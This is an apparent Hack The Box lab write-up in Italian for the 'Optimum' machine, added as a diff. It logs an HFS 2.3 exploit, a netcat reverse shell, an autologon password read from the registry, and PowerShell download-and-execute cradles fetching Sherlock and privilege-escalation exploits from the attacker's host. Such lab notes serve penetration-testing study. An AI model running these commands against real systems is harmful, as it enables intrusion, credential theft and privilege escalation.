@@ -1,0 +1,150 @@
+10.10.10.8
+
+
+PORT 80:
+
+c'è HFS (HttpFileServer)
+http://www.rejetto.com/hfs/         HFS 2.3
+
+c'è questo exploit:
+
+https://www.exploit-db.com/exploits/49584
+
+funziona!
+
+nc -lvnp 1111
+listening on [any] 1111 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.10.10.8] 49158
+
+PS C:\Users\kostas\Desktop> whoami
+optimum\kostas
+PS C:\Users\kostas\Desktop> 
+
+
+PS C:\Users\kostas\Desktop> type user.txt.txt
+d0c39409d7b994a9a1389ebf38ef5f73
+
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon
+    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
+    LegalNoticeText    REG_SZ    
+    Shell    REG_SZ    explorer.exe
+    LegalNoticeCaption    REG_SZ    
+    DebugServerCommand    REG_SZ    no
+    ForceUnlockLogon    REG_DWORD    0x0
+    ReportBootOk    REG_SZ    1
+    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
+    AutoRestartShell    REG_DWORD    0x1
+    PowerdownAfterShutdown    REG_SZ    0
+    ShutdownWithoutLogon    REG_SZ    0
+    Background    REG_SZ    0 0 0
+    PreloadFontFile    REG_SZ    SC-Load.All
+    PasswordExpiryWarning    REG_DWORD    0x5
+    CachedLogonsCount    REG_SZ    10
+    WinStationsDisabled    REG_SZ    0
+    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
+    DisableCAD    REG_DWORD    0x1
+    scremoveoption    REG_SZ    0
+    ShutdownFlags    REG_DWORD    0x13
+    AutoLogonSID    REG_SZ    S-1-5-21-605891470-2991919448-81205106-1001
+    LastUsedUsername    REG_SZ    kostas
+    AutoAdminLogon    REG_SZ    1
+    DefaultUsername    REG_SZ    kostas
+    DefaultPassword    REG_SZ    kdeEjDowkS*
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\AlternateShells
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\GPExtensions
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\AutoLogonChecked
+
+
+    DefaultUsername    REG_SZ    kostas
+    DefaultPassword    REG_SZ    kdeEjDowkS*
+
+
+PS C:\> cmdkey /list
+
+Currently stored credentials:
+
+* NONE *
+
+
+
+provo ad usare Sherlock
+
+powershell "iex(new-object net.webclient).downloadString('http://10.10.14.11/Sherlock.ps1');Find-AllVulns"
+
+ottengo:
+
+
+Title      : Windows Kernel-Mode Drivers EoP
+MSBulletin : MS16-034
+CVEID      : 2016-0093/94/95/96
+Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
+VulnStatus : Appears Vulnerable
+
+Title      : Win32k Elevation of Privilege
+MSBulletin : MS16-135
+CVEID      : 2016-7255
+Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
+VulnStatus : Appears Vulnerable
+
+
+
+powershell "iex(new-object net.webclient).downloadString('http://10.10.14.11/MS16-135.ps1')"    -----> non funziona
+
+
+provo ad utilizzare 
+https://github.com/pentestmonkey/windows-privesc-check
+
+
+powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.11/windows-privesc-check2.exe', 'windows-privesc-check2.exe')
+
+non mi da nulla di utile, posso provare con WinPeas o con windows exploit suggester
+
+provo prima win exploit suggester che è piu facile da usare 
+
+python3 windows-exploit-suggester.py --update
+python3 windows-exploit-suggester.py --database 2022-07-06-mssb.xlsx --systeminfo /home/daerves/Desktop/SecNotes/htb/oscp_like/optimum/systeminfo
+
+
+tra tutti gli exploit suggeriti quelli che potrebbero essere utili per privesc sono:
+
+  https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
+  https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
+  [M]
+MS16-075: Security Update for Windows SMB Server (3164038) - Important
+[*]
+  https://github.com/foxglovesec/RottenPotato
+[*]
+  https://github.com/Kevin-Robertson/Tater
+[*]
+  https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
+[*]
+  https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalat
+
+
+  [E]
+MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
+[*]
+  https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
+[*]
+  https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
+[*]
+  https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
+[*]
+  https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
+
+
+
+
+
+tra questi provo:
+
+https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
+
+lo trovo già compilato 
+
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
+
+
+51ed1b36553c8461f4552c2e92b3eeed
